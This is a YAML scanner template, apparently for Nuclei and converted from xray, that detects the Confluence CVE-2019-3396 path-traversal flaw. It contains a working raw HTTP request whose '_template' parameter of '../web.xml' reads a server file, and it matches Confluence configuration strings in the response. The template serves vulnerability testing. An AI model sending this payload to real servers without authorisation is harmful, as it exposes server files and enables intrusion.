id: poc-yaml-confluence-cve-2019-3396-path-traversal

info:
  name: poc-yaml-confluence-cve-2019-3396-path-traversal
  author: xray-converter
  severity: critical
  tags: xray-converted,traversal,cve-2019-3396,ct-83758
  reference:
    - https://paper.seebug.org/886/
    - https://github.com/vulhub/vulhub/tree/master/confluence/CVE-2019-3396

http:
  - raw:
      - |
        POST /rest/tinymce/1/macro/preview HTTP/1.1
        Host: {{Hostname}}
        Content-Type: application/json

        {"contentId":"786458","macro":{"name":"widget","body":"","params":{"url":"https://www.viddler.com/v/23464dc6","width":"1000","height":"1000","_template":"../web.xml"}}}
        

    matchers-condition: and
    matchers:
      - type: word
        part: body
        words:
          - "<display-name>Confluence</display-name>"
          - "<param-name>contextConfigLocation</param-name>"